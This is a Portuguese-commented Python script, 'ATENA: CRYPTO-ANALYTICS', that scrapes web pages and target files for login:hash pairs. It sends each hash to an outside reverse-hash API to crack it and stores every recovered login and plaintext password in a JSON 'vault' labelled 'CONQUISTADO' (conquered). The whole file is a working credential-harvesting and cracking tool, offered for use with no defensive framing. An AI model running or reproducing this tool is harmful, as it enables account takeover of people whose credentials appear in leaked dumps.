#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATENA: CRYPTO-ANALYTICS v4.3
Foco: Extração de Credenciais via Hashes e Varredura de Links.
Copyright (c) 2026 Danilo Gomes.
"""
import hashlib
import json
import os
import sys
import subprocess
import re
from datetime import datetime
from pathlib import Path

# AUTO-INSTALAÇÃO
try:
    import requests
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

# CONFIGURAÇÕES
BASE_DIR = Path(__file__).resolve().parent
ARQUIVO_ALVOS = BASE_DIR / "alvos.txt"
VAULT = BASE_DIR / "atena_vault.json"

# Expressão regular para encontrar logins e hashes em textos brutos ou sites
# Procura por: email/user : hash(32 ou 64 chars)
CRED_PATTERN = re.compile(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}|[a-zA-Z0-9._-]+):([a-fA-F0-9]{32,64})')

class AtenaOmniEngine:
    def __init__(self):
        self._init_vault()

    def _init_vault(self):
        if not VAULT.exists():
            with open(VAULT, "w", encoding="utf-8") as f:
                json.dump([], f)

    def save_access(self, login, password, source):
        try:
            with open(VAULT, "r", encoding="utf-8") as f:
                vault = json.load(f)
            if any(e['login'] == login and e['password'] == password for e in vault):
                return False
            entry = {
                "data": datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
                "login": login,
                "password": password,
                "origem": source,
                "status": "CONQUISTADO",
                "author": "Danilo Gomes"
            }
            vault.append(entry)
            with open(VAULT, "w", encoding="utf-8") as f:
                json.dump(vault, f, indent=4, ensure_ascii=False)
            return True
        except Exception as e:
            print(f"⚠️ Erro ao salvar: {e}")
            return False

    def solve(self, h):
        """Tenta reverter o hash via OSINT."""
        try:
            url = f"https://api.hackertarget.com/reversehash/?q={h}"
            r = requests.get(url, timeout=7)
            if r.status_code == 200 and ":" in r.text:
                return r.text.split(":")[-1].strip()
        except:
            pass
        return None

    def scan_url(self, target_url):
        """Entra no link e extrai credenciais."""
        print(f"🌐 Varrendo link: {target_url}")
        try:
            r = requests.get(target_url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
            found = CRED_PATTERN.findall(r.text)
            return found # Retorna lista de (login, hash)
        except Exception as e:
            print(f"❌ Erro ao acessar link: {e}")
            return []

def main():
    engine = AtenaOmniEngine()
    print(f"🧬 ATENA: CRYPTO-ANALYTICS v4.3 [OMNI-MODE]")
    print(f"👤 Danilo Gomes | Foco: Links e Hashes")
    print("-" * 55)

    if not ARQUIVO_ALVOS.exists():
        print(f"❌ Arquivo 'alvos.txt' não encontrado.")
        return

    with open(ARQUIVO_ALVOS, 'r', encoding='utf-8') as f:
        linhas = [l.strip() for l in f if l.strip()]

    for line in linhas:
        # Verifica se a linha é um link
        if line.startswith("http"):
            credenciais = engine.scan_url(line)
            if not credenciais:
                print(f"ℹ️ Nenhum par login:hash encontrado no link.")
                continue
            print(f"✅ Encontrado {len(credenciais)} alvos no link.")
            for login, h in credenciais:
                revelada = engine.solve(h)
                if revelada:
                    engine.save_access(login, revelada, f"Link: {line}")
                    print(f"🔓 CONQUISTADO: {login} | SENHA: {revelada}")
        
        # Se for formato login:hash direto
        elif ":" in line:
            login, h = line.split(':', 1)
            revelada = engine.solve(h.strip())
            if revelada:
                engine.save_access(login.strip(), revelada, "Direto")
                print(f"🔓 CONQUISTADO: {login} | SENHA: {revelada}")
            else:
                print(f"🔒 Falha no colapso de {login}")

    print("-" * 55)
    print(f"📊 Processo finalizado. Verifique {VAULT.name}")

if __name__ == "__main__":
    main()
    
